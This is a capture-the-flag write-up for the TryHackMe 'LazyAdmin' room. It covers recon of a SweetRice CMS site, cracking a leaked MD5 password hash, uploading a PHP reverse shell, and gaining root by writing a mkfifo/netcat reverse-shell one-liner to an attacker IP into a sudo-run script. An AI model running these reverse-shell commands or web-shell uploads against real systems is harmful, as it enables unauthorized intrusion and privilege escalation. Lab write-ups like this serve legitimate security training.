## THM CTF - LazyAdmin

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   lazy.thm
```
Now we can proceed with an Nmap scan.
```
sudo nmap -sS -T4 bounty.thm -p-
```
We discovered two open ports, and we can list the services they provide.
```
sudo nmap -sS -T4 lazy.thm -p22,80 -sV -sC
```
We proceed analysing the ```HTTP``` service with a ```Gobuster``` enumeration.
```
gobuster dir -u http://lazy.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,json,log,db,html
```
Discovering a ```content``` folder.
```
gobuster dir -u http://lazy.thm/content -w /usr/share/wordlists/dirb/common.txt -x php,txt,json,log,db,html
```
This time we are able to discover more folders, however we identify the ```CMS``` installed as ```SweetRice```.
```
searchsploit sweetrice
```
There are some exploit, but we need at least to identify the CMS version.

After some time spent navigating the site, we discovered many interesting information.
```
http://lazy.thm/content/inc/lastest.txt
```
gives us the versione of SweetRice.
```
http://lazy.thm/content/as/
```
This is the login page.
```
http://lazy.thm/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```
This is a potentially useful mysql backup.
```
searchsploit sweetrice
```
This version is exceptionally vulnerable (file upload), but we leave this analysis for later, let's explore the downloaded sql file.

We managed to discover some credentials:
```
manager
*************************
```
using hash-identifier we identify this as an MD5 hash.
```
cat ************************* > hash.txt
hash-identifier hash.txt
```
Then we use ```HashCat``` to brute force the password.
```
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
Discovering the password required to access the ```admin login page```.
```
************
```
After logging in, exploring the ```admin dashboard```, we find the ```media center``` section where we are able to upload something.

We can try with a php web shell.
```
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
```
We need to change the ```IP address``` in the file, and now we can upload and open it on the site.

However, we need to open the ```listening port``` to accept connections from the attack machine.
```
nc -nvlp 1234
```
And we're in! We find the ```first flag``` in the ```itguy``` main folder.

We proceed enumerating the main folder.
```
mysql_login.txt -> rice:randompass
backup.pl ->  #! /usr/bin/perl system("sh", "/etc/copy.sh");
```
We cannot edit the file ```backup.pl``` but we can edit the file ```/etc/copy.sh```, and change the IP contained in it.
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attack_IP] 5554 >/tmp/f" > /etc/copy.sh
```
On the attacker machine we can set ```Netcat``` to listen on ```port 5554```.
```
nc -nlvp 5554
```
On the target machine
```
sudo perl /home/itguy/backup.pl
```
We've obtained a reverse shell with ```root``` access.
```
/bin/bash -i
```
We can now easily navigate to the root folder to find the ```second flag```.
